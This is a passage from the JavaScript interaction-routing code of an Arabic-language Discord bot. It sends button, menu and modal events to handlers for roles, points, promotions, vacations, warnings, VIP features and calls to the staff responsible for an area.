        // معالجة الرول المرتبط بالزر
        let roleStatus = "";
        if (btn.roleId && interaction.guild) {
            try {
                // إرجاء الرد لإعطاء وقت كافٍ لمعالجة الرولات
                if (!interaction.deferred && !interaction.replied) {
                    await interaction.deferReply({ ephemeral: true }).catch(err => {
                        if (err.code !== 10062) throw err;
                    });
                }

                // التحقق مرة أخرى من حالة التفاعل بعد التأجيل
                if (!interaction.deferred && !interaction.replied) return;

                let member = interaction.guild.members.cache.get(interaction.user.id);
                if (!member) member = await interaction.guild.members.fetch(interaction.user.id);
                
                let role = interaction.guild.roles.cache.get(btn.roleId);
                if (!role) role = await interaction.guild.roles.fetch(btn.roleId);

                if (role) {
                    const roleMention = interaction.guild.roles.cache.get(role.id) ? `<@&${role.id}>` : `**${role.name}**`;
                    if (member.roles.cache.has(role.id)) {
                        await member.roles.remove(role, 'إزالة رول عبر خريطة السيرفر');
                        roleStatus = `\n\n✅ **تم سحب رول:** ${roleMention}`;
                    } else {
                        await member.roles.add(role, 'إعطاء رول عبر خريطة السيرفر');
                        roleStatus = `\n\n✅ **تم منحك رول:** ${roleMention}`;
                    }
                }
            } catch (roleErr) {
                if (roleErr.code !== 10062) {
                    console.error('Error handling map button role:', roleErr);
                    roleStatus = `\n\n⚠️ **فشل في منح/سحب الرول:** ${roleErr.message}`;
                }
            }
        }

        const rows = [];
        const links = btn.links || (btn.link ? [{ label: btn.linkLabel || 'انتقال للروم', url: btn.link }] : []);
        
        if (links.length > 0) {
            let currentRow = new ActionRowBuilder();
            links.forEach((linkData, i) => {
                if (i > 0 && i % 5 === 0) {
                    rows.push(currentRow);
                    currentRow = new ActionRowBuilder();
                }
                currentRow.addComponents(
                    new ButtonBuilder()
                        .setLabel(linkData.label || 'انتقال للروم')
                        .setURL(linkData.url)
                        .setStyle(ButtonStyle.Link)
                );
            });
            rows.push(currentRow);
        }

        const replyPayload = {
            content: (btn.description || 'لا يوجد شرح متاح.') + roleStatus,
            components: rows,
            ephemeral: true
        };

        if (interaction.deferred || interaction.replied) {
            await interaction.editReply(replyPayload).catch(err => console.error('Error in editReply:', err));
        } else {
            await interaction.reply(replyPayload).catch(async err => {
                if (err.code === 50007) {
                    console.log(`🚫 لا يمكن الرد على ${interaction.user.tag} لأن الخاص مغلق أو لا يمكن الوصول إليه.`);
                } else {
                    console.error('Interaction Reply Error:', err);
                }
            });
        }
        return;
    }

    // --- End of Consolidated Handlers ---



    // Handle log system interactions
    if (interaction.customId && (interaction.customId.startsWith('log_') ||
        interaction.customId === 'auto_set_logs' ||
        interaction.customId === 'disable_all_logs' ||
        interaction.customId === 'manage_log_roles' ||
        interaction.customId === 'add_log_roles' ||
        interaction.customId === 'remove_all_log_roles')) {
        console.log(`معالجة تفاعل السجلات: ${interaction.customId}`);

        const logCommand = client.commands.get('log');
        if (logCommand && typeof logCommand.handleInteraction === 'function') {
            await logCommand.handleInteraction(interaction, client, typeof saveData !== 'undefined' ? saveData : () => {});
        }
        return;
    }

    // --- Points, Rating and Activity Modification System ---
    if (interaction.customId && (
        interaction.customId.startsWith('points_edit_') ||
        interaction.customId.startsWith('activity_edit_') ||
        interaction.customId.startsWith('rating_edit_') ||
        interaction.customId.startsWith('edit_points_') ||
        interaction.customId.startsWith('modify_activity_') ||
        interaction.customId === 'edit_points_start' ||
        interaction.customId === 'select_resp_for_edit'
    )) {
        console.log(`معالجة تفاعل تعديل النقاط/النشاط: ${interaction.customId}`);

        try {
            // Handle points editing interactions
            if (interaction.customId.startsWith('points_edit_') ||
                interaction.customId.startsWith('edit_points_') ||
                interaction.customId === 'edit_points_start') {

                const resetCommand = client.commands.get('reset');
                if (resetCommand && resetCommand.handleMainInteraction) {
                    await resetCommand.handleMainInteraction(interaction);
                } else {
                    console.log('⚠️ لم يتم العثور على معالج تعديل النقاط في أمر reset');
                    await interaction.reply({
                        content: '❌ معالج تعديل النقاط غير متوفر حالياً',
                        flags: MessageFlags.Ephemeral
                    });
                }
                return;
            }

            // Handle activity editing interactions
            if (interaction.customId.startsWith('activity_edit_') ||
                interaction.customId.startsWith('modify_activity_')) {

                const statsCommand = client.commands.get('stats');
                if (statsCommand && statsCommand.handleActivityEdit) {
                    await statsCommand.handleActivityEdit(interaction, {
                        points: typeof points !== 'undefined' ? points : {},
                        responsibilities: typeof global.responsibilities !== 'undefined' ? global.responsibilities : {},
                        saveData: typeof scheduleSave !== 'undefined' ? scheduleSave : () => {},
                        client: client
                    });
                } else {
                    console.log('⚠️ لم يتم العثور على معالج تعديل النشاط');
                    await interaction.reply({
                        content: '❌ معالج تعديل النشاط غير متوفر حالياً',
                        flags: MessageFlags.Ephemeral
                    });
                }
                return;
            }

            // Handle rating editing interactions
            if (interaction.customId.startsWith('rating_edit_')) {

                const setadminCommand = client.commands.get('setadmin');
                if (setadminCommand && setadminCommand.handleInteraction) {
                    await setadminCommand.handleInteraction(interaction);
                } else {
                    console.log('⚠️ لم يتم العثور على معالج تعديل التقييم');
                    await interaction.reply({
                        content: '❌ معالج تعديل التقييم غير متوفر حالياً',
                        flags: MessageFlags.Ephemeral
                    });
                }
                return;
            }

            // Handle responsibility selection for editing
            if (interaction.customId === 'select_resp_for_edit') {
                const resetCommand = client.commands.get('reset');
                if (resetCommand && resetCommand.handleMainInteraction) {
                    await resetCommand.handleMainInteraction(interaction);
                } else {
                    console.log('⚠️ لم يتم العثور على معالج اختيار المسؤولية للتعديل');
                    await interaction.reply({
                        content: '❌ معالج اختيار المسؤولية للتعديل غير متوفر حالياً',
                        flags: MessageFlags.Ephemeral
                    });
                }
                return;
            }

            // Fallback for any unhandled edit interactions
            console.log(`⚠️ تفاعل تعديل غير مُعرَّف: ${interaction.customId}`);
            await interaction.reply({
                content: '❌ هذه الميزة قيد التطوير - يرجى المحاولة لاحقاً',
                flags: MessageFlags.Ephemeral
            });

        } catch (error) {
            console.error('خطأ في معالجة تفاعلات تعديل النقاط/النشاط:', error);
            if (!interaction.replied && !interaction.deferred) {
                await interaction.reply({
                    content: '❌ حدث خطأ أثناء معالجة طلب التعديل',
                    flags: MessageFlags.Ephemeral
                });
            }
        }
        return;
    }

    // تم نقل معالجة تفاعلات التقارير إلى المعالج المستقل في report.js
    // لتجنب المعالجة المكررة والأخطاء

    // --- SetAdmin System Interaction Router ---
    if (interaction.customId && (
        interaction.customId === 'setadmin_menu' ||
        interaction.customId === 'select_application_channel' ||
        interaction.customId === 'select_approver_type' ||
        interaction.customId === 'select_approver_roles' ||
        interaction.customId === 'select_approver_responsibility' ||
        interaction.customId === 'select_acceptance_role' ||
        interaction.customId === 'set_pending_limit_modal' ||
        interaction.customId === 'set_cooldown_modal' ||
        interaction.customId === 'select_evaluation_setting' ||
        interaction.customId === 'messages_criteria_modal' ||
        interaction.customId === 'voice_time_criteria_modal' ||
        interaction.customId === 'activity_criteria_modal' ||
        interaction.customId === 'server_time_criteria_modal' ||
        interaction.customId === 'reactions_criteria_modal' ||
        interaction.customId.startsWith('channel_page_') ||
        interaction.customId.startsWith('roles_page_') ||
        interaction.customId.startsWith('acceptance_role_page_') ||
        interaction.customId.startsWith('resp_page_') ||
        interaction.customId === 'back_to_setadmin_menu'
    )) {
        console.log(`معالجة تفاعل setadmin: ${interaction.customId}`);

        try {
            const setAdminCommand = client.commands.get('setadmin');
            if (setAdminCommand && typeof setAdminCommand.handleInteraction === 'function') {
                await setAdminCommand.handleInteraction(interaction);
            }
        } catch (error) {
            console.error('خطأ في معالجة تفاعل setadmin:', error);
            try {
                if (!interaction.replied && !interaction.deferred) {
                    await interaction.reply({
                        content: 'حدث خطأ في معالجة إعدادات التقديم الإداري.',
                        flags: MessageFlags.Ephemeral
                    });
                }
            } catch (replyError) {
                console.error('خطأ في الرد على خطأ setadmin:', replyError);
            }
        }
        return;
    }

    // --- Responsibility System Interaction Router ---
    if (interaction.customId === 'resp_delete_all_confirm') {
        const respCommand = client.commands.get('resp');
        if (respCommand && typeof respCommand.handleDeleteAllConfirm === 'function') {
            await respCommand.handleDeleteAllConfirm(interaction, client);
        }
        return;
    }

    if (interaction.customId === 'resp_delete_all_cancel') {
        await interaction.update({ content: '❌ تم إلغاء عملية الحذف.', embeds: [], components: [] });
        return;
    }

    // --- Admin Application System Interaction Router ---
    if (interaction.customId && (
        interaction.customId.startsWith('admin_approve_') ||
        interaction.customId.startsWith('admin_reject_') ||
        interaction.customId.startsWith('admin_select_roles_') ||
        interaction.customId.startsWith('admin_details_')
    )) {
        console.log(`معالجة تفاعل التقديم الإداري: ${interaction.customId}`);

        try {
            if (typeof handleAdminApplicationInteraction === 'function') {
                const handled = await handleAdminApplicationInteraction(interaction);
                if (!handled) {
                    console.log('لم يتم معالجة التفاعل في نظام التقديم الإداري');
                }
            }
        } catch (error) {
            console.error('خطأ في معالجة التقديم الإداري:', error);
            try {
                if (!interaction.replied && !interaction.deferred) {
                    await interaction.reply({
                        content: '❌ حدث خطأ في معالجة طلب التقديم الإداري.',
                        flags: MessageFlags.Ephemeral
                    });
                }
            } catch (replyError) {
                console.error('خطأ في الرد على خطأ التقديم الإداري:', replyError);
            }
        }
        return;
    }

    // Handle bulk promotion statistics navigation
    if (interaction.customId && (interaction.customId.includes('stats_nav_') || interaction.customId.startsWith('bulk_promotion_members_'))) {
        console.log(`معالجة تفاعل إحصائيات المترقين: ${interaction.customId}`);

        try {
            if (typeof handleBulkPromotionStats === 'function') {
                await handleBulkPromotionStats(interaction, client);
            }
        } catch (error) {
            console.error('خطأ في معالجة إحصائيات المترقين:', error);
            try {
                if (!interaction.replied && !interaction.deferred) {
                    await interaction.reply({
                        content: '❌ حدث خطأ أثناء عرض الإحصائيات.',
                        flags: MessageFlags.Ephemeral
                    });
                }
            } catch (replyError) {
                console.error('خطأ في الرد على خطأ الإحصائيات:', replyError);
            }
        }
        return;
    }

    // Handle promotion records navigation and deletion buttons
    if (interaction.customId && (
        interaction.customId.startsWith('role_record_prev_') ||
        interaction.customId.startsWith('role_record_next_') ||
        interaction.customId.startsWith('delete_record_') ||
        interaction.customId.startsWith('delete_all_records_') ||
        interaction.customId.startsWith('confirm_delete_all_') ||
        interaction.customId === 'cancel_delete_all' ||
        interaction.customId === 'promote_records_back'
    )) {
        console.log(`معالجة تفاعل سجلات الترقيات: ${interaction.customId}`);

        try {
            const promoteContext = { client, BOT_OWNERS };
            const promoteCommand = client.commands.get('promote');

            if (promoteCommand && promoteCommand.handleInteraction) {
                await promoteCommand.handleInteraction(interaction, promoteContext);
            } else {
                // إذا لم يتم العثور على أمر promote، استخدم promoteManager مباشرة
                await promoteManager.handleInteraction(interaction, promoteContext);
            }
        } catch (error) {
            console.error('خطأ في معالجة سجلات الترقيات:', error);
            try {
                if (!interaction.replied && !interaction.deferred) {
                    await interaction.reply({
                        content: '❌ حدث خطأ في معالجة سجلات الترقيات.',
                        flags: MessageFlags.Ephemeral
                    });
                }
            } catch (replyError) {
                console.error('خطأ في الرد على خطأ سجلات الترقيات:', replyError);
            }
        }
        return;
    }

    // --- Promotion System Interaction Router ---
    if (interaction.customId && interaction.customId.startsWith('promote_')) {
        console.log(`معالجة تفاعل نظام الترقيات: ${interaction.customId}`);

        try {
            const promoteContext = typeof context !== 'undefined' ? context : { client, BOT_OWNERS: typeof BOT_OWNERS !== 'undefined' ? BOT_OWNERS : [] };
            const promoteCommand = client.commands.get('promote');

            if (promoteCommand && typeof promoteCommand.handleInteraction === 'function') {
                await promoteCommand.handleInteraction(interaction, promoteContext);
            } else if (typeof promoteManager !== 'undefined' && promoteManager && typeof promoteManager.handleInteraction === 'function') {
                // إذا لم يتم العثور على أمر promote، استخدم promoteManager مباشرة
                await promoteManager.handleInteraction(interaction, promoteContext);
            }
        } catch (error) {
            console.error('خطأ في معالجة نظام الترقيات:', error);
            try {
                if (!interaction.replied && !interaction.deferred) {
                    await interaction.reply({
                        content: '❌ حدث خطأ في معالجة نظام الترقيات.',
                        flags: MessageFlags.Ephemeral
                    });
                }
            } catch (replyError) {
                console.error('خطأ في الرد على خطأ نظام الترقيات:', replyError);
            }
        }
        return;
    }

    // --- Vacation System Interaction Router ---
    if (interaction.customId && interaction.customId.startsWith('vac_')) {
        const vacationContext = typeof context !== 'undefined' ? context : { client, BOT_OWNERS: typeof BOT_OWNERS !== 'undefined' ? BOT_OWNERS : [] };

        // Handle Rejection buttons SPECIFICALLY before deferUpdate
        if (interaction.isButton() && (interaction.customId.startsWith('vac_reject_') || interaction.customId.startsWith('vac_reject_termination_'))) {
            if (interaction.customId.startsWith('vac_reject_termination_')) {
                const myVacationCommand = client.commands.get('اجازتي');
                if (myVacationCommand && typeof myVacationCommand.handleInteraction === 'function') {
                    await myVacationCommand.handleInteraction(interaction, vacationContext);
                }
            } else {
                const vacationCommand = client.commands.get('اجازه');
                if (vacationCommand && typeof vacationCommand.handleInteraction === 'function') {
                    await vacationCommand.handleInteraction(interaction, vacationContext);
                }
            }
            return;
        }

        // Handle regular vacation approvals and rejections
        if (interaction.isButton() && interaction.customId.startsWith('vac_approve_') && !interaction.customId.startsWith('vac_approve_termination_')) {
            const vacationCommand = client.commands.get('اجازه');
            if (vacationCommand && typeof vacationCommand.handleInteraction === 'function') {
                await vacationCommand.handleInteraction(interaction, vacationContext);
            }
            return;
        }

        if (interaction.customId.startsWith('vac_list_') || 
            interaction.customId.startsWith('vac_pending_') || 
            interaction.customId.startsWith('vac_terminate_') ||
            interaction.customId.startsWith('vac_term_')) {

            const vacationsCommand = client.commands.get('اجازات');

            if (vacationsCommand && typeof vacationsCommand.handleInteraction === 'function') {

                await vacationsCommand.handleInteraction(interaction, vacationContext);

            }

            return;

        }

        // Route to set-vacation command - تحسين معالجة التفاعلات
        if (interaction.customId.includes('_set_') ||
            interaction.customId.includes('_choice_') ||
            interaction.customId.includes('_select') ||
            interaction.customId.includes('_back_') ||
            interaction.customId === 'vac_set_approver' ||
            interaction.customId === 'vac_set_notification' ||
            interaction.customId === 'vac_back_main' ||
            interaction.customId === 'vac_reject_cooldown_modal' ||
            interaction.customId.startsWith('vac_choice_') ||
            interaction.customId === 'vac_role_select' ||
            interaction.customId === 'vac_channel_select' ||
            interaction.customId === 'vac_resp_select') {
             const setVacationCommand = client.commands.get('set-vacation');
             if (setVacationCommand && typeof setVacationCommand.handleInteraction === 'function') {
                 await setVacationCommand.handleInteraction(interaction, vacationContext);
             }
             return;
        }

        // Route to vacation (ajaza) command
        if (interaction.customId.startsWith('vac_request_')) {
            const vacationCommand = client.commands.get('اجازه');
            if (vacationCommand && typeof vacationCommand.handleInteraction === 'function') {
                await vacationCommand.handleInteraction(interaction, vacationContext);
            }
            return;
        }

        // Route to my-vacation (ajazati) command for all vacation ending interactions
        if (interaction.customId.startsWith('vac_end_request_') ||
            interaction.customId.startsWith('vac_end_confirm_') ||
            interaction.customId === 'vac_end_cancel' ||
            interaction.customId.startsWith('vac_approve_termination_')) {
            const myVacationCommand = client.commands.get('اجازتي');
            if (myVacationCommand && typeof myVacationCommand.handleInteraction === 'function') {
                await myVacationCommand.handleInteraction(interaction, vacationContext);
            }
            return;
        }

        // Handle modal submissions and leftover vacation interactions
        if (interaction.customId && (interaction.customId.startsWith('vac_reject_modal_') || interaction.customId.startsWith('vac_reject_termination_modal_'))) {
            if (interaction.customId.startsWith('vac_reject_termination_modal_')) {
                const myVacationCommand = client.commands.get('اجازتي');
                if (myVacationCommand && typeof myVacationCommand.handleInteraction === 'function') {
                    await myVacationCommand.handleInteraction(interaction, vacationContext);
                }
            } else {
                const vacationCommand = client.commands.get('اجازه');
                if (vacationCommand && typeof vacationCommand.handleInteraction === 'function') {
                    await vacationCommand.handleInteraction(interaction, vacationContext);
                }
            }
            return;
        }
    }
      if (interaction.customId && interaction.customId.startsWith('myprofile_')) {
        const myProfileCommand = client.commands.get('myprofile');
        if (myProfileCommand && myProfileCommand.handleInteraction) {
            await myProfileCommand.handleInteraction(interaction, client);
        }
        return;
      }
        if (customId === 'suggestion_button') {

      const respCommand = client.commands.get('resp');

      if (respCommand && respCommand.handleSuggestionButton) {

        await respCommand.handleSuggestionButton(interaction, client);

      }

      return;

    }
    
    // معالج منيو اختيار المسؤولية
    if (customId === 'resp_info_select') {
      const respCommand = client.commands.get('resp');
      if (respCommand && respCommand.handleResponsibilitySelect) {
        await respCommand.handleResponsibilitySelect(interaction, client);
      }
      return;
    }

    // Handle resp modal submissions

    if (interaction.isModalSubmit() && customId === 'suggestion_modal') {

      const respCommand = client.commands.get('resp');

      if (respCommand && typeof respCommand.handleSuggestionModal === 'function') {

        await respCommand.handleSuggestionModal(interaction, client);

      }

      return;
    }

    // Handle adminroles interactions (including refresh buttons)
    if (customId.startsWith('adminroles_') || customId === 'admin_roles_select' || customId === 'admin_roles_add' || customId === 'admin_roles_remove') {
      try {
        const adminrolesCommand = client.commands.get('adminroles');
        if (adminrolesCommand && typeof adminrolesCommand.handleInteraction === 'function') {
          await adminrolesCommand.handleInteraction(interaction, typeof context !== 'undefined' ? context : { client });
        } else {
          console.log('⚠️ لم يتم العثور على معالج adminroles');
          if (!interaction.replied && !interaction.deferred) {
            await interaction.reply({ 
              content: '❌ معالج adminroles غير متوفر حالياً', 
              flags: MessageFlags.Ephemeral 
            });
          }
        }
      } catch (error) {
        console.error('Error in adminroles interaction:', error);
        if (!interaction.replied && !interaction.deferred) {
          await interaction.reply({ 
            content: '❌ حدث خطأ أثناء معالجة التفاعل!', 
            flags: MessageFlags.Ephemeral 
          }).catch(() => {});
        }
      }
      return;
    }

    // Handle DM down interactions separately
    if (interaction.customId && interaction.customId.startsWith('dm_down_')) {
        console.log(`معالجة تفاعل DM down: ${interaction.customId}`);
        const downCommand = client.commands.get('down');
        if (downCommand && downCommand.handleInteraction) {
            await downCommand.handleInteraction(interaction, context);
        }
        return;
    }

    // Handle cooldown system interactions (including modals)
    if (interaction.customId && (interaction.customId.startsWith('cooldown_') || 
        (interaction.isModalSubmit() && interaction.customId === 'cooldown_search_responsibility_modal'))) {
        const cooldownCommand = client.commands.get('cooldown');
        if (cooldownCommand && cooldownCommand.handleInteraction) {
            await cooldownCommand.handleInteraction(interaction, context);
        }
        return;
    }

    // --- Down System Interaction Router ---
    if (interaction.customId && (interaction.customId.startsWith('down_') || interaction.customId.startsWith('dm_down_'))) {
        console.log(`معالجة تفاعل down: ${interaction.customId}`);

        // Load fresh admin roles for down system
        const ADMIN_ROLES = typeof getCachedAdminRoles === 'function' ? getCachedAdminRoles() : [];
        const downContext = typeof context !== 'undefined' ? { ...context, ADMIN_ROLES } : { client, ADMIN_ROLES };

        const downCommand = client.commands.get('down');
        if (downCommand && typeof downCommand.handleInteraction === 'function') {
            try {
                await downCommand.handleInteraction(interaction, downContext);
            } catch (error) {
                console.error('خطأ في معالجة تفاعل down:', error);
                if (!interaction.replied && !interaction.deferred) {
                    await interaction.reply({
                        content: '❌ حدث خطأ أثناء معالجة التفاعل. يرجى المحاولة مرة أخرى.',
                        flags: MessageFlags.Ephemeral
                    }).catch(() => {});
                }
            }
        }
        return;
    }

    // --- Warn System Interaction Router ---
    if (interaction.customId && interaction.customId.startsWith('warn_')) {
        console.log(`معالجة تفاعل warn: ${interaction.customId}`);

        const warnCommand = client.commands.get('warn');
        if (warnCommand && typeof warnCommand.handleInteraction === 'function') {
            try {
                const warnContext = typeof context !== 'undefined' ? context : { client };
                await warnCommand.handleInteraction(interaction, warnContext);
            } catch (error) {
                console.error('خطأ في معالجة تفاعل warn:', error);
                if (!interaction.replied && !interaction.deferred) {
                    await interaction.reply({
                        content: '❌ حدث خطأ أثناء معالجة التفاعل. يرجى المحاولة مرة أخرى.',
                        flags: MessageFlags.Ephemeral
                    }).catch(() => {});
                }
            }
        }
        return;
    }

    // Handle notifications system interactions
    if (interaction.customId && (interaction.customId.startsWith('notification_') ||
        interaction.customId === 'select_responsibility_time')) {
        const notificationsCommand = client.commands.get('notifications');
        if (notificationsCommand && typeof notificationsCommand.handleInteraction === 'function') {
            await notificationsCommand.handleInteraction(interaction, typeof context !== 'undefined' ? context : { client });
        }
        return;
    }

    // Handle notifications modal submissions (including search)
    if (interaction.isModalSubmit() && (interaction.customId.startsWith('change_global_time_modal') ||
        interaction.customId.startsWith('responsibility_time_modal_') ||
        interaction.customId === 'notifications_search_responsibility_modal')) {
        const notificationsCommand = client.commands.get('notifications');
        if (notificationsCommand && typeof notificationsCommand.handleModalSubmit === 'function') {
            await notificationsCommand.handleModalSubmit(interaction, client, typeof global.responsibilities !== 'undefined' ? global.responsibilities : {});
        } else if (interaction.customId === 'notifications_search_responsibility_modal') {
            // إضافة معالج مباشر للبحث
            if (notificationsCommand && typeof notificationsCommand.handleInteraction === 'function') {
                await notificationsCommand.handleInteraction(interaction, typeof context !== 'undefined' ? context : { client });
            }
        }
        return;
    }

    // Handle VIP system interactions
    if (interaction.customId && (interaction.customId.startsWith('vip_') ||
        interaction.customId === 'vip_status_select')) {
        const vipCommand = client.commands.get('vip');
        if (vipCommand && typeof vipCommand.handleInteraction === 'function') {
            await vipCommand.handleInteraction(interaction, client, { guild: interaction.guild, author: interaction.user });
        }
        return;
    }

    // Handle VIP modal submissions
    if (interaction.isModalSubmit() && interaction.customId.startsWith('activity_after_date_modal_')) {
        const activityStatsCommand = client.commands.get('تفاعلي');
        if (activityStatsCommand && typeof activityStatsCommand.handleModalSubmit === 'function') {
            await activityStatsCommand.handleModalSubmit(interaction, client);
        }
        return;
    }

    if (interaction.isModalSubmit() && (interaction.customId === 'vip_prefix_modal' ||
        interaction.customId === 'vip_name_modal' ||
        interaction.customId === 'vip_avatar_modal' ||
        interaction.customId === 'vip_banner_modal' ||
        interaction.customId.startsWith('activity_modal_'))) {
        const vipCommand = client.commands.get('vip');
        if (vipCommand && typeof vipCommand.handleModalSubmit === 'function') {
            await vipCommand.handleModalSubmit(interaction, client);
        }
        return;
    }

    // Handle Streak system interactions
    if (interaction.customId && (
        interaction.customId.startsWith('streak_') ||
        interaction.customId === 'streak_divider_modal' ||
        interaction.customId === 'streak_emojis_modal'
    )) {
        console.log(`🔍 معالجة تفاعل Streak: ${interaction.customId}`);
        
        try {
            const streakCommand = client.commands.get('streak');
            if (streakCommand && streakCommand.handleInteraction) {
                await streakCommand.handleInteraction(interaction, { client, BOT_OWNERS });
            } else {
                console.log('⚠️ لم يتم العثور على معالج Streak');
                await interaction.reply({
                    content: '❌ معالج Streak غير متوفر حالياً',
                    flags: MessageFlags.Ephemeral
                });
            }
        } catch (error) {
            console.error('❌ خطأ في معالجة تفاعل Streak:', error);
            if (!interaction.replied && !interaction.deferred) {
                await interaction.reply({
                    content: '❌ حدث خطأ في معالجة الطلب',
                    flags: MessageFlags.Ephemeral
                });
            }
        }
        return;
    }

    // Handle category interactions (buttons and select menus)
    if (interaction.customId && (
        interaction.customId === 'add_category' ||
        interaction.customId === 'edit_category' ||
        interaction.customId === 'delete_category' ||
        interaction.customId === 'manage_category_resps' ||
        interaction.customId === 'reorder_category_resps' ||
        interaction.customId.startsWith('select_category_') ||
        interaction.customId.startsWith('confirm_delete_') ||
        interaction.customId === 'cancel_delete' ||
        interaction.customId.startsWith('save_category_resps_') ||
        interaction.customId.startsWith('add_resps_to_category_') ||
        interaction.customId.startsWith('category_resps_nav_')
    )) {
        const ctgCommand = client.commands.get('ctg');
        if (ctgCommand && typeof ctgCommand.handleInteraction === 'function') {
            await ctgCommand.handleInteraction(interaction, typeof context !== 'undefined' ? context : { client });
        }
        return;
    }

    // Handle category modal submissions
    if (interaction.isModalSubmit() && (interaction.customId === 'add_category_modal' ||
        interaction.customId.startsWith('edit_category_modal_') ||
        interaction.customId === 'reorder_category_resps_modal')) {
        const ctgCommand = client.commands.get('ctg');
        if (ctgCommand && typeof ctgCommand.handleModalSubmit === 'function') {
            await ctgCommand.handleModalSubmit(interaction, client);
        }
        return;
    }

    // معالج report تم نقله إلى ملف report.js كمعالج مستقل

    // === معالج زر الاستدعاء من اختصارات المنشن ===
    if (interaction.isButton() && interaction.customId.startsWith('shortcut_call_')) {
      console.log(`[SHORTCUT_CALL] زر استدعاء: ${interaction.customId}`);
      
      // فحص البلوك
      const { isUserBlocked } = require('./commands/block.js');
      if (isUserBlocked(interaction.user.id)) {
        return;
      }
      
      // جلب البيانات المحفوظة
      const callData = client.shortcutCallData?.get(interaction.customId);
      if (!callData) {
        // الرد بـ ephemeral فقط إذا لم يتم الرد مسبقاً
        if (!interaction.replied && !interaction.deferred) {
          await interaction.reply({ content: '**انتهت صلاحية هذا الزر. يرجى استخدام الاختصار مرة أخرى.**', flags: 64 }).catch(() => {});
        }
        return;
      }
      
      // التحقق من أن الضاغط هو نفس الشخص اللي استخدم الاختصار
      if (interaction.user.id !== callData.requesterId) {
        if (!interaction.replied && !interaction.deferred) {
          await interaction.reply({ content: '**هذا الزر مخصص فقط للشخص الذي استخدم الاختصار.**', flags: 64 }).catch(() => {});
        }
        return;
      }
      
      // فحص الكولداون
      const { checkCooldown } = require('./commands/cooldown.js');
      const cooldownTime = checkCooldown(interaction.user.id, callData.responsibilityName);
      if (cooldownTime > 0) {
        if (!interaction.replied && !interaction.deferred) {
          await interaction.reply({
            content: `**لقد استخدمت هذا الأمر مؤخرًا. يرجى الانتظار ${Math.ceil(cooldownTime / 1000)} ثانية أخرى.**`,
            flags: 64
          }).catch(() => {});
        }
        return;
      }
      
      // إظهار نموذج لإدخال السبب
      const modal = new ModalBuilder()
        .setCustomId(`shortcut_call_modal_${interaction.customId.replace('shortcut_call_', '')}`)
        .setTitle(`استدعاء مسؤولي: ${callData.responsibilityName}`);
      
      const reasonInput = new TextInputBuilder()
        .setCustomId('call_reason')
        .setLabel('سبب الاستدعاء')
        .setStyle(TextInputStyle.Paragraph)
        .setRequired(true)
        .setPlaceholder('اكتب سبب الاستدعاء...')
        .setMaxLength(1000);
      
      const actionRow = new ActionRowBuilder().addComponents(reasonInput);
      modal.addComponents(actionRow);
      
      try {
        await interaction.showModal(modal);
      } catch (err) {
        console.error(`[CATCH] error showing modal: ${err.message}`);
        if (!interaction.replied && !interaction.deferred) {
           await interaction.reply({ content: '❌ حدث خطأ أثناء محاولة فتح النافذة، يرجى المحاولة مرة أخرى.', flags: 64 }).catch(() => {});
        }
      }
      return;
    }
    
      // === معالج نموذج الاستدعاء من اختصارات المنشن ===
    if (interaction.isModalSubmit() && interaction.customId.startsWith('shortcut_call_modal_')) {
      console.log(`[SHORTCUT_CALL_MODAL] نموذج استدعاء: ${interaction.customId}`);
      
      // منع التفاعلات المكررة
      if (interaction.replied || interaction.deferred) return;

      const { isUserBlocked } = require('./commands/block.js');
      if (isUserBlocked(interaction.user.id)) return;
      
      const buttonCustomId = 'shortcut_call_' + interaction.customId.replace('shortcut_call_modal_', '');
      const callData = client.shortcutCallData?.get(buttonCustomId);
      
      if (!callData) {
        await interaction.reply({ content: '**انتهت صلاحية هذا النموذج. يرجى استخدام الاختصار مرة أخرى.**', flags: 64 }).catch(() => {});
        return;
      }
      
      const reason = interaction.fields.getTextInputValue('call_reason').trim() || 'غير محدد';
      const { responsibilityName, responsibles, channelId, messageId, guildId } = callData;
      
      // تأجيل الرد فوراً لتجنب انتهاء الوقت
      await interaction.deferReply({ ephemeral: true }).catch(() => {});
      
      // بدء الكولداون
      const { startCooldown } = require('./commands/cooldown.js');
      startCooldown(interaction.user.id, responsibilityName);
      
      const messageLink = `https://discord.com/channels/${guildId}/${channelId}/${messageId}`;
      const currentTime = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });

      // إنشاء الزر للذهاب للرسالة
      const linkButton = new ButtonBuilder()
        .setLabel('اذهب للرساله')
        .setStyle(ButtonStyle.Link)
        .setURL(messageLink);
      const row = new ActionRowBuilder().addComponents(linkButton);

      // إرسال الرسالة لخاص المسؤولين
      let successCount = 0;
      for (const userId of responsibles) {
        try {
          const user = await client.users.fetch(userId);
          await user.send({
            content: `**🔔 استدعاك إداري **\n\n` +
                     `**● المسؤولية :** ${responsibilityName}\n` +
                     `**● الإداري المستدعي :** <@${interaction.user.id}>\n` +
                     `**● الوقت :** ${currentTime}\n` +
                     `**● السبب :** ${reason}`,
            components: [row]
          });
          successCount++;
        } catch (err) {
          console.error(`فشل إرسال رسالة خاصة للمسؤول ${userId}:`, err.message);
        }
      }
      
      // تحديث رسالة المنشنات الأصلية لإزالة الأزرار
      try {
        const originalChannel = await client.channels.fetch(channelId);
        const originalMessage = await originalChannel.messages.fetch(messageId);
        await originalMessage.edit({ components: [] });
      } catch (err) {}

      // تسجيل الحدث
      logEvent(client, interaction.guild, {
        type: 'TASK_LOGS',
        title: 'استدعاء مسؤولين (خاص)',
        description: `تم استدعاء مسؤولي "${responsibilityName}" عبر الخاص`,
        user: interaction.user,
        fields: [
          { name: 'المسؤولية', value: responsibilityName, inline: true },
          { name: 'السبب', value: reason, inline: false },
          { name: 'عدد المسؤولين الناجح', value: `${successCount}/${responsibles.length}`, inline: true }
        ]
      });
      
      await interaction.editReply({ content: `**✅ تم استدعاء مسؤولي "${responsibilityName}" عبر الخاص!**` }).catch(() => {});
      client.shortcutCallData.delete(buttonCustomId);
      return;
    }

    // Handle masoul interactions - تمرير جميع التفاعلات المتعلقة بـ masoul إلى معالج مستقل
    if (
      (interaction.isButton() && interaction.customId.startsWith('claim_task_')) ||
      (interaction.isModalSubmit() && interaction.customId.startsWith('call_reason_modal_')) ||
      (interaction.isButton() && interaction.customId.startsWith('go_to_call_')) ||
      (interaction.isModalSubmit() && interaction.customId.startsWith('masoul_modal_'))
    ) {
        console.log(`[MASOUL] تفاعل: ${interaction.customId}`);
        const masoulCommand = client.commands.get('مسؤول');
        if (masoulCommand && masoulCommand.handleInteraction) {
            await masoulCommand.handleInteraction(interaction, context);
        }
        return;
    }

    // Handle modal submissions for setup
